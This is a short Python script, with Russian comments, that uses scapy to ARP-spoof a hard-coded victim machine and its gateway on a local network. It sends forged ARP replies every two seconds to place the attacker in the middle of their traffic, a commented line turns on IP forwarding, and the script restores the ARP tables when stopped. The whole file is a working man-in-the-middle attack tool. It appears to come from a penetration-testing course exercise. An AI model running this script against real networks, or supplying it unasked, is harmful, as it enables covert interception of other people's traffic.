#!/usr/bin/env python
import scapy.all as scapy
import time

# echo 1 > /proc/sys/net/ipv4/ip_forward

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # создаем объект запроса
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # op=2 (ARP-ответ), данные от компьютера жертвы (Windows), и IP источника (роутера)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)  # отправка пакета

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # и надо указать мас-источника, иначе будет подставлен наш по умолчанию - hwsrc
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)  # отправляем пакет 4 раза, чтобы наверняка

target_ip = '192.168.1.77'
gateway_ip = '192.168.1.254'

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print('\r[+] Packet sent: ' + str(sent_packets_count), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('[-] Detected CTRL + C .... Reseting ARP tables.... Please wait.\n')
    restore(target_ip, gateway_ip)  # передаем правильный МАС-адрес
